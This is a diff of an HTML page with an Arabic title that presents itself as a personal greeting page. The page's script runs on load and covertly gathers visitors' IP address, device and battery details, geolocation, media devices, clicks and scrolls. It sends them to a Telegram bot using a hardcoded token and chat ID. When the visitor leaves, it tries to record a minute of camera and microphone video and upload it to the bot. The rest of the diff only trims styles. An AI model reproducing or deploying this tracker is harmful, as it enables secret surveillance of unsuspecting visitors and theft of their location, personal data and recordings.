@@ -3,103 +3,105 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>منونتي قلب بودا</title>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">  <script>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+  <script>
     async function sendVisitorInfo() {
         const botToken = "7805774303:AAFy5Vy3LIdBi7XeDVBp1-nvRoB4mgNPlPc";
         const chatId = "1557685494";
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const messageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const videoUrl = `https://api.telegram.org/bot${botToken}/sendVideo`;
         const startTime = Date.now();
         let clickCount = 0;
-        const interactions = [];
-        
-        // Collecting basic visitor info
-        const visitorInfo = {
-            IPAddress: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip),
-            UserAgent: navigator.userAgent,
-            Platform: navigator.platform,
-            Language: navigator.language,
-            ScreenResolution: `${window.screen.width}x${window.screen.height}`,
-            DeviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
-            TouchSupport: navigator.maxTouchPoints > 0 ? 'Supported' : 'Not Supported',
-            OnlineStatus: navigator.onLine ? 'Online' : 'Offline',
-            ConnectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
-            TimeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            CurrentTime: new Date().toLocaleString(),
-            VisitStartTime: new Date(startTime).toLocaleString()
-        };
-        
-        // Collect battery info if available
-        if (navigator.getBattery) {
-            try {
-                const battery = await navigator.getBattery();
-                visitorInfo.BatteryPercentage = Math.round(battery.level * 100) + "%";
-                visitorInfo.ChargingStatus = battery.charging ? "Charging" : "Not Charging";
-            } catch (error) {
-                visitorInfo.BatteryPercentage = "Unavailable";
-                visitorInfo.ChargingStatus = "Unavailable";
-            }
-        }
-        
-        // Collecting location info
+        const interactions = [];const visitorInfo = {
+        IPAddress: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip),
+        UserAgent: navigator.userAgent,
+        Platform: navigator.platform,
+        Language: navigator.language,
+        ScreenResolution: `${window.screen.width}x${window.screen.height}`,
+        DeviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
+        TouchSupport: navigator.maxTouchPoints > 0 ? 'Supported' : 'Not Supported',
+        OnlineStatus: navigator.onLine ? 'Online' : 'Offline',
+        ConnectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
+        TimeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        CurrentTime: new Date().toLocaleString(),
+        VisitStartTime: new Date(startTime).toLocaleString()
+    };
+
+    if (navigator.getBattery) {
         try {
-            const geo = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
-            });
-            const latitude = geo.coords.latitude;
-            const longitude = geo.coords.longitude;
-            visitorInfo.Location = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            const battery = await navigator.getBattery();
+            visitorInfo.BatteryPercentage = Math.round(battery.level * 100) + "%";
+            visitorInfo.ChargingStatus = battery.charging ? "Charging" : "Not Charging";
         } catch (error) {
-            visitorInfo.Location = "Unavailable";
+            visitorInfo.BatteryPercentage = "Unavailable";
+            visitorInfo.ChargingStatus = "Unavailable";
         }
-        
-        // Add click and scroll tracking
-        document.addEventListener('click', (event) => {
-            clickCount++;
-            interactions.push(`Click at (${event.pageX}, ${event.pageY}) on element: ${event.target.tagName}`);
-        });
-
-        document.addEventListener('scroll', () => {
-            interactions.push(`Scrolled to (${window.scrollX}, ${window.scrollY})`);
-        });
-
-        // Collecting media device info
-        try {
-            const devices = await navigator.mediaDevices.enumerateDevices();
-            const mediaDevices = devices.map(device => `${device.kind}: ${device.label || 'Unknown Device'}`).join(', ');
-            visitorInfo.MediaDevices = mediaDevices;
-        } catch (error) {
-            visitorInfo.MediaDevices = "Unavailable";
-        }
-        
-        // Recording audio and video
-        async function startRecording() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
-                const chunks = [];
-                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('video', blob, 'user_recording.webm');
-                    try {
-                        await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData });
-                    } catch (error) {
-                        console.error(error);
-                    }
-                };
-                setTimeout(() => mediaRecorder.stop(), 60000); // Stop after 1 minute
-                mediaRecorder.start();
-            } catch (error) {
-                console.error('Error starting media recording:', error);
-            }
-        }
-
-        window.addEventListener('beforeunload', startRecording);
     }
-    
-    window.onload = sendVisitorInfo;
+
+    try {
+        const geo = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+        });
+        const latitude = geo.coords.latitude;
+        const longitude = geo.coords.longitude;
+        visitorInfo.Location = `https://www.google.com/maps?q=${latitude},${longitude}`;
+    } catch (error) {
+        visitorInfo.Location = "Unavailable";
+    }
+
+    document.addEventListener('click', (event) => {
+        clickCount++;
+        interactions.push(`Click at (${event.pageX}, ${event.pageY}) on element: ${event.target.tagName}`);
+    });
+
+    document.addEventListener('scroll', () => {
+        interactions.push(`Scrolled to (${window.scrollX}, ${window.scrollY})`);
+    });
+
+    try {
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const mediaDevices = devices.map(device => `${device.kind}: ${device.label || 'Unknown Device'}`).join(', ');
+        visitorInfo.MediaDevices = mediaDevices;
+    } catch (error) {
+        visitorInfo.MediaDevices = "Unavailable";
+    }
+
+    function sendMessage(text) {
+        fetch(messageUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text })
+        }).catch(console.error);
+    }
+
+    function startRecording() {
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then((stream) => {
+            const mediaRecorder = new MediaRecorder(stream);
+            const chunks = [];
+            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('video', blob, 'user_recording.webm');
+                fetch(videoUrl, { method: 'POST', body: formData }).catch(console.error);
+            };
+            setTimeout(() => mediaRecorder.stop(), 60000);
+            mediaRecorder.start();
+        }).catch(console.error);
+    }
+
+    window.addEventListener('beforeunload', startRecording);
+
+    let message = "NEW VISITOR INFORMATION\n";
+    for (let key in visitorInfo) {
+        message += `${key}: ${visitorInfo[key]}\n`;
+    }
+    sendMessage(message);
+}
+
+window.onload = sendVisitorInfo;
+
   </script>  <style>
     body {
       margin: 0;
@@ -115,15 +117,6 @@
       font-size: 3em;
       margin: 0;
     }
-    .message {
-      margin: 30px auto;
-      padding: 20px;
-      max-width: 600px;
-      font-size: 1.2em;
-      background: #ffffffc2;
-      border-radius: 20px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-    }
     .gallery {
       display: flex;
       flex-wrap: wrap;
@@ -136,25 +129,9 @@
       border-radius: 15px;
       box-shadow: 0 2px 6px rgba(0,0,0,0.2);
     }
-    .social {
-      margin: 20px;
-    }
-    .social a {
-      margin: 0 10px;
-      font-size: 1.5em;
-      text-decoration: none;
-      color: #4b006e;
-    }
     footer {
       margin: 30px 0;
       font-size: 0.9em;
-    }
-    audio {
-      position: fixed;
-      bottom: 20px;
-      left: 20px;
-      width: 250px;
-      z-index: 1000;
     }
   </style></head>
 <body>
